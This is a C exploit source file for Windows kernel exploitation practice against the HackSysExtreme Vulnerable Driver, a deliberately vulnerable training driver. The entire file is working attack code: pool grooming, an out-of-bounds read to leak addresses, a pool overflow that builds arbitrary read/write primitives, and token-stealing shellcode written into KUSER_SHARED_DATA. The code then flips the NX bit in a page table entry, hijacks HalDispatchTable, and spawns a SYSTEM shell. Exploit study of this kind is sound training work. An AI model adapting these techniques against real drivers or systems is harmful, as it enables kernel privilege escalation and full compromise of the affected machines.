// HackSysExtreme Vulnerable Driver: Pool Overflow + Memory Disclosure
// Author: Connor McGarr (@33y0re)

#include <windows.h>
#include <stdio.h>

// typdef an ARW_HELPER_OBJECT_IO struct
typedef struct _ARW_HELPER_OBJECT_IO
{
	PVOID HelperObjectAddress;
	PVOID Name;
	SIZE_T Length;
} ARW_HELPER_OBJECT_IO, * PARW_HELPER_OBJECT_IO;

// Create a global array of ARW_HELPER_OBJECT_IO objects to manage the groomed pool allocations
ARW_HELPER_OBJECT_IO helperobjectArray[5000] = { 0 };

// Prepping call to nt!NtQueryIntervalProfile
typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(IN ULONG ProfileSource, OUT PULONG Interval);

// Leak the base of HEVD.sys
unsigned long long memLeak(HANDLE driverHandle)
{
	// Array to manage handles opened by CreateEventA
	HANDLE eventObjects[5000];

	// Spray 5000 objects to fill the new page
	for (int i = 0; i <= 5000; i++)
	{
		// Create the objects
		HANDLE tempHandle = CreateEventA(
			NULL,
			FALSE,
			FALSE,
			NULL
		);

		// Assign the handles to the array
		eventObjects[i] = tempHandle;
	}

	// Check to see if the first handle is a valid handle
	if (eventObjects[0] == NULL)
	{
		printf("[-] Error! Unable to spray CreateEventA objects! Error: 0x%lx\n", GetLastError());

		return 0x1;
		exit(-1);
	}
	else
	{
		printf("[+] Sprayed CreateEventA objects to fill holes of size 0x80!\n");

		// Close half of the handles
		for (int i = 0; i <= 5000; i += 2)
		{
			BOOL tempHandle1 = CloseHandle(
				eventObjects[i]
			);

			eventObjects[i] = NULL;

			// Error handling
			if (!tempHandle1)
			{
				printf("[-] Error! Unable to free the CreateEventA objects! Error: 0x%lx\n", GetLastError());

				return 0x1;
				exit(-1);
			}
		}

		printf("[+] Poked holes in the new pool page!\n");

		// Allocate UaF Objects in place of the poked holes by just invoking the IOCTL, which will call ExAllocatePoolWithTag for a UAF object
		// kLFH should automatically fill the freed holes with the UAF objects
		DWORD bytesReturned;

		for (int i = 0; i < 2500; i++)
		{
			DeviceIoControl(
				driverHandle,
				0x00222053,
				NULL,
				0,
				NULL,
				0,
				&bytesReturned,
				NULL
			);
		}

		printf("[+] Allocated objects containing a pointer to HEVD in place of the freed CreateEventA objects!\n");

		// Close the rest of the event objects
		for (int i = 1; i <= 5000; i += 2)
		{
			BOOL tempHandle2 = CloseHandle(
				eventObjects[i]
			);

			eventObjects[i] = NULL;

			// Error handling
			if (!tempHandle2)
			{
				printf("[-] Error! Unable to free the rest of the CreateEventA objects! Error: 0x%lx\n", GetLastError());

				return 0x1;
				exit(-1);
			}
		}

		// Array to store the buffer (output buffer for DeviceIoControl) and the base address
		unsigned long long outputBuffer[100];
		unsigned long long hevdBase = 0;

		// Everything is now, theoretically, [FREE, UAFOBJ, FREE, UAFOBJ, FREE, UAFOBJ], barring any more randomization from the kLFH
		// Fill some of the holes, but not all, with vulnerable chunks that can read out-of-bounds (we don't want to fill up all the way to avoid reading from a page that isn't mapped)

		for (int i = 0; i <= 100; i++)
		{
			// Return buffer
			DWORD bytesReturned1;

			DeviceIoControl(
				driverHandle,
				0x0022204f,
				NULL,
				0,
				&outputBuffer,
				sizeof(outputBuffer),
				&bytesReturned1,
				NULL
			);

		}

		printf("[+] Successfully triggered the out-of-bounds read!\n");

		// Parse the output
		for (int i = 0; i <= 100; i++)
		{
			// Kernel mode address?
			if ((outputBuffer[i] & 0xfffff00000000000) == 0xfffff00000000000)
			{
				printf("[+] Address of function pointer in HEVD.sys: 0x%llx\n", outputBuffer[i]);
				printf("[+] Base address of HEVD.sys: 0x%llx\n", outputBuffer[i] - 0x880CC);

				// Store the variable for future usage
				hevdBase = outputBuffer[i] - 0x880CC;

				// Return the value of the base of HEVD
				return hevdBase;
			}
		}
	}
}

// Function used to fill the holes in pool pages
void fillHoles(HANDLE driverHandle)
{
	// Instantiate an ARW_HELPER_OBJECT_IO
	ARW_HELPER_OBJECT_IO tempObject = { 0 };

	// Value to assign the Name member of each ARW_HELPER_OBJECT_IO
	unsigned long long nameValue = 0x9090909090909090;

	// Set the length to 0x8 so that the Name member of an ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object allocated in the pool has its Name member allocated to size 0x8, a 64-bit pointer size
	tempObject.Length = 0x8;

	// Bytes returned
	DWORD bytesreturnedFill;

	for (int i = 0; i <= 5000; i++)
	{
		// Set the Name value to 0x9090909090909090
		tempObject.Name = &nameValue;

		// Allocate a ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object with a Name member of size 0x8 and a Name value of 0x9090909090909090
		DeviceIoControl(
			driverHandle,
			0x00222063,
			&tempObject,
			sizeof(tempObject),
			&tempObject,
			sizeof(tempObject),
			&bytesreturnedFill,
			NULL
		);

		// Using non-controlled arbitrary write to set the Name member of the ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object to 0x9090909090909090 via the Name member of each ARW_HELPER_OBJECT_IO
		// This will be used later on to filter out which ARW_HELPER_OBJECT_NON_PAGED_POOL_NX HAVE NOT been corrupted successfully (e.g. their Name member is 0x9090909090909090 still)
		DeviceIoControl(
			driverHandle,
			0x00222067,
			&tempObject,
			sizeof(tempObject),
			&tempObject,
			sizeof(tempObject),
			&bytesreturnedFill,
			NULL
		);

		// After allocating the ARW_HELPER_OBJECT_NON_PAGED_POOL_NX objects (via the ARW_HELPER_OBJECT_IO objects), assign each ARW_HELPER_OBJECT_IO structures to the global managing array
		helperobjectArray[i] = tempObject;
	}

	printf("[+] Sprayed ARW_HELPER_OBJECT_IO objects to fill holes in the NonPagedPoolNx with ARW_HELPER_OBJECT_NON_PAGED_POOL_NX objects!\n");
}

// Fill up the new page within the NonPagedPoolNx with ARW_HELPER_OBJECT_NON_PAGED_POOL_NX objects
void groomPool(HANDLE driverHandle)
{
	// Instantiate an ARW_HELPER_OBJECT_IO
	ARW_HELPER_OBJECT_IO tempObject1 = { 0 };

	// Value to assign the Name member of each ARW_HELPER_OBJECT_IO
	unsigned long long nameValue1 = 0x9090909090909090;

	// Set the length to 0x8 so that the Name member of an ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object allocated in the pool has its Name member allocated to size 0x8, a 64-bit pointer size
	tempObject1.Length = 0x8;

	// Bytes returned
	DWORD bytesreturnedGroom;

	for (int i = 0; i <= 5000; i++)
	{
		// Set the Name value to 0x9090909090909090
		tempObject1.Name = &nameValue1;

		// Allocate a ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object with a Name member of size 0x8 and a Name value of 0x9090909090909090
		DeviceIoControl(
			driverHandle,
			0x00222063,
			&tempObject1,
			sizeof(tempObject1),
			&tempObject1,
			sizeof(tempObject1),
			&bytesreturnedGroom,
			NULL
		);

		// Using non-controlled arbitrary write to set the Name member of the ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object to 0x9090909090909090 via the Name member of each ARW_HELPER_OBJECT_IO
		// This will be used later on to filter out which ARW_HELPER_OBJECT_NON_PAGED_POOL_NX HAVE NOT been corrupted successfully (e.g. their Name member is 0x9090909090909090 still)
		DeviceIoControl(
			driverHandle,
			0x00222067,
			&tempObject1,
			sizeof(tempObject1),
			&tempObject1,
			sizeof(tempObject1),
			&bytesreturnedGroom,
			NULL
		);

		// After allocating the ARW_HELPER_OBJECT_NON_PAGED_POOL_NX objects (via the ARW_HELPER_OBJECT_IO objects), assign each ARW_HELPER_OBJECT_IO structures to the global managing array
		helperobjectArray[i] = tempObject1;
	}

	printf("[+] Filled the new page with ARW_HELPER_OBJECT_NON_PAGED_POOL_NX objects!\n");
}

// Free every other object in the global array to poke holes for the vulnerable objects
void pokeHoles(HANDLE driverHandle)
{
	// Bytes returned
	DWORD bytesreturnedPoke;

	// Free every other element in the global array managing objects in the new page from grooming
	for (int i = 0; i <= 5000; i += 2)
	{
		DeviceIoControl(
			driverHandle,
			0x0022206f,
			&helperobjectArray[i],
			sizeof(helperobjectArray[i]),
			&helperobjectArray[i],
			sizeof(helperobjectArray[i]),
			&bytesreturnedPoke,
			NULL
		);
	}

	printf("[+] Poked holes in the NonPagedPoolNx page containing the ARW_HELPER_OBJECT_NON_PAGED_POOL_NX objects!\n");
}

// Create the main ARW_HELPER_OBJECT_IO
ARW_HELPER_OBJECT_IO createmainObject(HANDLE driverHandle)
{
	// Instantiate an object of type ARW_HELPER_OBJECT_IO
	ARW_HELPER_OBJECT_IO helperObject = { 0 };

	// Set the Length member which corresponds to the amount of memory used to allocate a chunk to store the Name member eventually
	helperObject.Length = 0x8;

	// Bytes returned
	DWORD bytesReturned2;

	// Invoke CreateArbitraryReadWriteHelperObjectNonPagedPoolNx to create the main ARW_HELPER_OBJECT_NON_PAGED_POOL_NX
	DeviceIoControl(
		driverHandle,
		0x00222063,
		&helperObject,
		sizeof(helperObject),
		&helperObject,
		sizeof(helperObject),
		&bytesReturned2,
		NULL
	);

	// Parse the output
	printf("[+] PARW_HELPER_OBJECT_IO->HelperObjectAddress: 0x%p\n", helperObject.HelperObjectAddress);
	printf("[+] PARW_HELPER_OBJECT_IO->Name: 0x%p\n", helperObject.Name);
	printf("[+] PARW_HELPER_OBJECT_IO->Length: 0x%zu\n", helperObject.Length);

	return helperObject;
}

// Read/write primitive
void readwritePrimitive(HANDLE driverHandle)
{
	// Store the value of the base of HEVD
	unsigned long long hevdBase = memLeak(driverHandle);

	// Store the main ARW_HELOPER_OBJECT
	ARW_HELPER_OBJECT_IO mainObject = createmainObject(driverHandle);

	// Fill the holes
	fillHoles(driverHandle);

	// Groom the pool
	groomPool(driverHandle);

	// Poke holes
	pokeHoles(driverHandle);

	// Use buffer overflow to take "main" ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object's Name value (managed by ARW_HELPER_OBJECT_IO.Name) to overwrite any of the groomed ARW_HELPER_OBJECT_NON_PAGED_POOL_NX.Name values
	// Create a buffer that first fills up the vulnerable chunk of 0x10 (16) bytes
	unsigned long long vulnBuffer[5];
	vulnBuffer[0] = 0x4141414141414141;
	vulnBuffer[1] = 0x4141414141414141;

	// Hardcode the _POOL_HEADER value for a ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object
	vulnBuffer[2] = 0x6b63614802020000;

	// Padding
	vulnBuffer[3] = 0x4141414141414141;

	// Overwrite any of the adjacent ARW_HELPER_OBJECT_NON_PAGED_POOL_NX object's Name member with the address of the "main" ARW_HELPER_OBJECT_NON_PAGED_POOL_NX (via ARW_HELPER_OBJECT_IO.HelperObjectAddress)
	vulnBuffer[4] = mainObject.HelperObjectAddress;

	// Bytes returned
	DWORD bytesreturnedOverflow;
	DWORD bytesreturnedreadPrimtitve;

	printf("[+] Triggering the out-of-bounds-write via pool overflow!\n");

	// Trigger the pool overflow
	DeviceIoControl(
		driverHandle,
		0x0022204b,
		&vulnBuffer,
		sizeof(vulnBuffer),
		&vulnBuffer,
		0x28,
		&bytesreturnedOverflow,
		NULL
	);

	// Find which "groomed" object was overflowed
	int index = 0;
	unsigned long long placeholder = 0x9090909090909090;

	// Loop through every groomed object to find out which Name member was overwritten with the main ARW_HELPER_NON_PAGED_POOL_NX object
	for (int i = 0; i <= 5000; i++)
	{
		// The placeholder variable will be overwritten. Get operation will overwrite this variable with the real contents of each object's Name member
		helperobjectArray[i].Name = &placeholder;

		DeviceIoControl(
			driverHandle,
			0x0022206b,
			&helperobjectArray[i],
			sizeof(helperobjectArray[i]),
			&helperobjectArray[i],
			sizeof(helperobjectArray[i]),
			&bytesreturnedreadPrimtitve,
			NULL
		);

		// Loop until a Name value other than the original NOPs is found
		if (placeholder != 0x9090909090909090)
		{
			printf("[+] Found the overflowed object overwritten with main ARW_HELPER_NON_PAGED_POOL_NX object!\n");
			printf("[+] PARW_HELPER_OBJECT_IO->HelperObjectAddress: 0x%p\n", helperobjectArray[i].HelperObjectAddress);

			// Assign the index
			index = i;

			printf("[+] Array index of global array managing groomed objects: %d\n", index);

			// Break the loop
			break;
		}
	}

	// IAT entry from HEVD.sys which points to nt!ExAllocatePoolWithTag
	unsigned long long ntiatLeak = hevdBase + 0x2038;

	// Print update
	printf("[+] Target HEVD.sys address with pointer to ntoskrnl.exe: 0x%llx\n", ntiatLeak);

	// Assign the target address to the corrupted object
	helperobjectArray[index].Name = &ntiatLeak;

	// Set the Name member of the "corrupted" object managed by the global array. The main object is currently set to the Name member of one of the sprayed ARW_HELPER_OBJECT_NON_PAGED_POOL_NX that was corrupted via the pool overflow
	DeviceIoControl(
		driverHandle,
		0x00222067,
		&helperobjectArray[index],
		sizeof(helperobjectArray[index]),
		NULL,
		NULL,
		&bytesreturnedreadPrimtitve,
		NULL
	);

	// Declare variable that will receive the address of nt!ExAllocatePoolWithTag and initialize it
	unsigned long long ntPointer = 0x9090909090909090;

	// Setting the Name member of the main object to the address of the ntPointer variable. When the Name member is dereferenced and bubbled back up to user mode, it will overwrite the value of ntPointer
	mainObject.Name = &ntPointer;

	// Perform the "Get" operation on the main object, which should now have the Name member set to the IAT entry from HEVD
	DeviceIoControl(
		driverHandle,
		0x0022206b,
		&mainObject,
		sizeof(mainObject),
		&mainObject,
		sizeof(mainObject),
		&bytesreturnedreadPrimtitve,
		NULL
	);

	// Print the pointer to nt!ExAllocatePoolWithTag
	printf("[+] Leaked ntoskrnl.exe pointer! nt!ExAllocatePoolWithTag: 0x%llx\n", ntPointer);

	// Assign a variable the base of the kernel (static offset)
	unsigned long long kernelBase = ntPointer - 0x9b3160;

	// Print the base of the kernel
	printf("[+] ntoskrnl.exe base address: 0x%llx\n", kernelBase);

	// Assign a variable with nt!MiGetPteAddress+0x13
	unsigned long long migetpteAddress = kernelBase + 0x222073;

	// Print update
	printf("[+] nt!MiGetPteAddress+0x13: 0x%llx\n", migetpteAddress);

	// Assign the target address to the corrupted object
	helperobjectArray[index].Name = &migetpteAddress;

	// Set the Name member of the "corrupted" object managed by the global array to obtain the base of the PTEs
	DeviceIoControl(
		driverHandle,
		0x00222067,
		&helperobjectArray[index],
		sizeof(helperobjectArray[index]),
		NULL,
		NULL,
		&bytesreturnedreadPrimtitve,
		NULL
	);

	// Declare a variable that will receive the base of the PTEs
	unsigned long long pteBase = 0x9090909090909090;

	// Setting the Name member of the main object to the address of the pteBase variable
	mainObject.Name = &pteBase;

	// Perform the "Get" operation on the main object
	DeviceIoControl(
		driverHandle,
		0x0022206b,
		&mainObject,
		sizeof(mainObject),
		&mainObject,
		sizeof(mainObject),
		&bytesreturnedreadPrimtitve,
		NULL
	);

	// Print update
	printf("[+] Base of the page table entries: 0x%llx\n", pteBase);

	// Calculate the PTE page for our shellcode in KUSER_SHARED_DATA
	unsigned long long shellcodePte = 0xfffff78000000800 >> 9;
	shellcodePte = shellcodePte & 0x7FFFFFFFF8;
	shellcodePte = shellcodePte + pteBase;

	// Print update
	printf("[+] KUSER_SHARED_DATA+0x800 PTE page: 0x%llx\n", shellcodePte);

	// Assign the target address to the corrupted object
	helperobjectArray[index].Name = &shellcodePte;

	// Set the Name member of the "corrupted" object managed by the global array to obtain the address of the shellcode PTE page
	DeviceIoControl(
		driverHandle,
		0x00222067,
		&helperobjectArray[index],
		sizeof(helperobjectArray[index]),
		NULL,
		NULL,
		&bytesreturnedreadPrimtitve,
		NULL
	);

	// Declare a variable that will receive the PTE bits
	unsigned long long pteBits = 0x9090909090909090;

	// Setting the Name member of the main object
	mainObject.Name = &pteBits;

	// Perform the "Get" operation on the main object
	DeviceIoControl(
		driverHandle,
		0x0022206b,
		&mainObject,
		sizeof(mainObject),
		&mainObject,
		sizeof(mainObject),
		&bytesreturnedreadPrimtitve,
		NULL
	);

	// Print update
	printf("[+] PTE bits for shellcode page: %p\n", pteBits);

	// Store nt!HalDispatchTable+0x8
	unsigned long long halTemp = kernelBase + 0xc00a68;

	// Assign the target address to the corrupted object
	helperobjectArray[index].Name = &halTemp;

	// Set the Name member of the "corrupted" object managed by the global array to obtain the pointer at nt!HalDispatchTable+0x8
	DeviceIoControl(
		driverHandle,
		0x00222067,
		&helperobjectArray[index],
		sizeof(helperobjectArray[index]),
		NULL,
		NULL,
		&bytesreturnedreadPrimtitve,
		NULL
	);

	// Declare a variable that will receive [nt!HalDispatchTable+0x8]
	unsigned long long halDispatch = 0x9090909090909090;

	// Setting the Name member of the main object
	mainObject.Name = &halDispatch;

	// Perform the "Get" operation on the main object
	DeviceIoControl(
		driverHandle,
		0x0022206b,
		&mainObject,
		sizeof(mainObject),
		&mainObject,
		sizeof(mainObject),
		&bytesreturnedreadPrimtitve,
		NULL
	);

	// Print update
	printf("[+] Preserved [nt!HalDispatchTable+0x8] value: 0x%llx\n", halDispatch);

	// Arbitrary write primitive

	/*
		; Windows 10 19H1 x64 Token Stealing Payload
		; Author Connor McGarr
		[BITS 64]
		_start:
			mov rax, [gs:0x188]		  ; Current thread (_KTHREAD)
			mov rax, [rax + 0xb8]	  ; Current process (_EPROCESS)
			mov rbx, rax			  ; Copy current process (_EPROCESS) to rbx
		__loop:
			mov rbx, [rbx + 0x448] 	  ; ActiveProcessLinks
			sub rbx, 0x448		   	  ; Go back to current process (_EPROCESS)
			mov rcx, [rbx + 0x440] 	  ; UniqueProcessId (PID)
			cmp rcx, 4 				  ; Compare PID to SYSTEM PID
			jnz __loop			      ; Loop until SYSTEM PID is found
			mov rcx, [rbx + 0x4b8]	  ; SYSTEM token is @ offset _EPROCESS + 0x360
			and cl, 0xf0			  ; Clear out _EX_FAST_REF RefCnt
			mov [rax + 0x4b8], rcx	  ; Copy SYSTEM token to current process
			xor rax, rax			  ; set NTSTATUS STATUS_SUCCESS
			ret						  ; Done!
	*/

	// Shellcode
	unsigned long long shellcode[9] = { 0 };
	shellcode[0] = 0x00018825048B4865;
	shellcode[1] = 0x000000B8808B4800;
	shellcode[2] = 0x04489B8B48C38948;
	shellcode[3] = 0x000448EB81480000;
	shellcode[4] = 0x000004408B8B4800;
	shellcode[5] = 0x8B48E57504F98348;
	shellcode[6] = 0xF0E180000004B88B;
	shellcode[7] = 0x48000004B8888948;
	shellcode[8] = 0x0000000000C3C031;

	// Assign the target address to write to the corrupted object
	unsigned long long kusersharedData = 0xfffff78000000800;

	// Create a "counter" for writing the array of shellcode
	int counter = 0;

	// For loop to write the shellcode
	for (int i = 0; i <= 9; i++)
	{
		// Setting the corrupted object to KUSER_SHARED_DATA+0x800 incrementally 9 times, since our shellcode is 9 QWORDS
		// kusersharedData variable, managing the current address of KUSER_SHARED_DATA+0x800, is incremented by 0x8 at the end of each iteration of the loop
		helperobjectArray[index].Name = &kusersharedData;

		// Setting the Name member of the main object to specify what we would like to write
		mainObject.Name = &shellcode[counter];

		// Set the Name member of the "corrupted" object managed by the global array to KUSER_SHARED_DATA+0x800, incrementally
		DeviceIoControl(
			driverHandle,
			0x00222067,
			&helperobjectArray[index],
			sizeof(helperobjectArray[index]),
			NULL,
			NULL,
			&bytesreturnedreadPrimtitve,
			NULL
		);

		// Perform the arbitrary write via "set" to overwrite each QWORD of KUSER_SHARED_DATA+0x800 until our shellcode is written
		DeviceIoControl(
			driverHandle,
			0x00222067,
			&mainObject,
			sizeof(mainObject),
			NULL,
			NULL,
			&bytesreturnedreadPrimtitve,
			NULL
		);

		// Increase the counter
		counter++;

		// Increase the counter
		kusersharedData += 0x8;
	}

	// Print update
	printf("[+] Successfully wrote the shellcode to KUSER_SHARED_DATA+0x800!\n");

	// Taint the PTE contents to corrupt the NX bit in KUSER_SHARED_DATA+0x800
	unsigned long long taintedBits = pteBits & 0x0FFFFFFFFFFFFFFF;

	// Print update
	printf("[+] Tainted PTE contents: %p\n", taintedBits);

	// Leverage the arbitrary write primitive to corrupt the PTE contents

	// Setting the Name member of the corrupted object to specify where we would like to write
	helperobjectArray[index].Name = &shellcodePte;

	// Specify what we would like to write (the tainted PTE contents)
	mainObject.Name = &taintedBits;

	// Set the Name member of the "corrupted" object managed by the global array to KUSER_SHARED_DATA+0x800's PTE virtual address
	DeviceIoControl(
		driverHandle,
		0x00222067,
		&helperobjectArray[index],
		sizeof(helperobjectArray[index]),
		NULL,
		NULL,
		&bytesreturnedreadPrimtitve,
		NULL
	);

	// Perform the arbitrary write
	DeviceIoControl(
		driverHandle,
		0x00222067,
		&mainObject,
		sizeof(mainObject),
		NULL,
		NULL,
		&bytesreturnedreadPrimtitve,
		NULL
	);

	// Print update
	printf("[+] Successfully corrupted the PTE of KUSER_SHARED_DATA+0x800! This region should now be marked as RWX!\n");

	// Leverage the arbitrary write primitive to overwrite nt!HalDispatchTable+0x8

	// Reset kusersharedData
	kusersharedData = 0xfffff78000000800;

	// Setting the Name member of the corrupted object to specify where we would like to write
	helperobjectArray[index].Name = &halTemp;

	// Specify where we would like to write (the address of KUSER_SHARED_DATA+0x800)
	mainObject.Name = &kusersharedData;

	// Set the Name member of the "corrupted" object managed by the global array to nt!HalDispatchTable+0x8
	DeviceIoControl(
		driverHandle,
		0x00222067,
		&helperobjectArray[index],
		sizeof(helperobjectArray[index]),
		NULL,
		NULL,
		&bytesreturnedreadPrimtitve,
		NULL
	);

	// Perform the arbitrary write
	DeviceIoControl(
		driverHandle,
		0x00222067,
		&mainObject,
		sizeof(mainObject),
		NULL,
		NULL,
		&bytesreturnedreadPrimtitve,
		NULL
	);

	// Print update
	printf("[+] Successfully corrupted [nt!HalDispatchTable+0x8]!\n");

	// Locating nt!NtQueryIntervalProfile
	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(
		GetModuleHandle(
			TEXT("ntdll.dll")),
		"NtQueryIntervalProfile"
	);

	// Error handling
	if (!NtQueryIntervalProfile)
	{
		printf("[-] Error! Unable to find ntdll!NtQueryIntervalProfile! Error: %d\n", GetLastError());
		exit(1);
	}

	// Print update for found ntdll!NtQueryIntervalProfile
	printf("[+] Located ntdll!NtQueryIntervalProfile at: 0x%llx\n", NtQueryIntervalProfile);

	// Calling nt!NtQueryIntervalProfile
	ULONG exploit = 0;
	NtQueryIntervalProfile(
		0x1234,
		&exploit
	);

	// Print update
	printf("[+] Successfully executed the shellcode!\n");

	// Leverage arbitrary write for restoration purposes

	// Setting the Name member of the corrupted object to specify where we would like to write
	helperobjectArray[index].Name = &halTemp;

	// Specify where we would like to write (the address of the preserved value at [nt!HalDispatchTable+0x8])
	mainObject.Name = &halDispatch;

	// Set the Name member of the "corrupted" object managed by the global array to nt!HalDispatchTable+0x8
	DeviceIoControl(
		driverHandle,
		0x00222067,
		&helperobjectArray[index],
		sizeof(helperobjectArray[index]),
		NULL,
		NULL,
		&bytesreturnedreadPrimtitve,
		NULL
	);

	// Perform the arbitrary write
	DeviceIoControl(
		driverHandle,
		0x00222067,
		&mainObject,
		sizeof(mainObject),
		NULL,
		NULL,
		&bytesreturnedreadPrimtitve,
		NULL
	);

	// Print update
	printf("[+] Successfully restored [nt!HalDispatchTable+0x8]!\n");

	// Print update for NT AUTHORITY\SYSTEM shell
	printf("[+] Enjoy the NT AUTHORITY\\SYSTEM shell!\n");

	// Spawning an NT AUTHORITY\SYSTEM shell
	system("cmd.exe /c cmd.exe /K cd C:\\");
}

void main(void)
{
	// Open a handle to the driver
	printf("[+] Obtaining handle to HEVD.sys...\n");

	HANDLE drvHandle = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0x0,
		NULL,
		OPEN_EXISTING,
		0x0,
		NULL
	);

	// Error handling
	if (drvHandle == (HANDLE)-1)
	{
		printf("[-] Error! Unable to open a handle to the driver. Error: 0x%lx\n", GetLastError());
		exit(-1);
	}
	else
	{
		readwritePrimitive(drvHandle);
	}
}
